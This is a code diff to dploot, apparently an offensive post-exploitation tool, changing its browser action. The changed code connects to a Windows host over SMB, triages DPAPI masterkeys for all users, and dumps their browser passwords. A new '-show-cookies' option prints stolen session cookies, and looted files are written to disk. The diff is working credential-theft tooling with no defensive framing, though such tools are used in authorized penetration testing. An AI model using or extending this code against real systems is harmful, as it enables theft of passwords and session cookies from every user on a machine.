@@ -9,13 +9,11 @@ from dploot.lib.smb import DPLootSMBConnection
 from dploot.lib.target import Target, add_target_argument_group
 from dploot.lib.utils import handle_outputdir_option, parse_file_as_list
 from dploot.triage.browser import BrowserTriage
-from dploot.triage.masterkeys import MasterkeysTriage
+from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
 
 NAME = 'browser'
 
 class BrowserAction:
-
-    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
 
     def __init__(self, options: argparse.Namespace) -> None:
         self.options = options
@@ -33,7 +31,7 @@ class BrowserAction:
 
         if self.options.mkfile is not None:
             try:
-                self.masterkeys = parse_file_as_list(self.options.mkfile)
+                self.masterkeys = parse_masterkey_file(self.options.mkfile)
             except Exception as e:
                 logging.error(str(e))
                 sys.exit(1)
@@ -48,15 +46,23 @@ class BrowserAction:
     def run(self) -> None:
         self.connect()
         logging.info("Connected to %s as %s\\%s %s" % (self.target.address, self.target.domain, self.target.username, ( "(admin)"if self.is_admin  else "")))
-        if self.masterkeys is None:
-            masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
-            masterkeytriage.triage_masterkeys()
-            self.masterkeys = masterkeytriage.masterkeys
-            for masterkey in self.masterkeys:
-                print(masterkey)
         if self.is_admin:
+            if self.masterkeys is None:
+                masterkeytriage = MasterkeysTriage(target=self.target, conn=self.conn, pvkbytes=self.pvkbytes, nthashes=self.nthashes, passwords=self.passwords)
+                logging.info("Triage ALL USERS masterkeys\n")
+                self.masterkeys = masterkeytriage.triage_masterkeys()
+                for masterkey in self.masterkeys:
+                    masterkey.dump()
+                print()
+        
             triage = BrowserTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys)
-            triage.triage_browsers()
+            logging.info('Triage Browser Credentials and Cookies for ALL USERS\n')
+            credentials, cookies = triage.triage_browsers()
+            for credential in credentials:
+                credential.dump()
+            if self.options.show_cookies:
+                for cookie in cookies:
+                    cookie.dump() 
             if self.outputdir is not None:
                 for filename, bytes in triage.looted_files.items():
                     with open(os.path.join(self.outputdir, filename),'wb') as outputfile:
@@ -91,6 +97,14 @@ def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable
     )
 
     add_masterkeys_argument_group(group)
+
+    group.add_argument(
+        "-show-cookies",
+        action="store_true",
+        help=(
+            "Output dumped cookies from browsers"
+        )
+    )
 
     group.add_argument(
         "-export-browser",
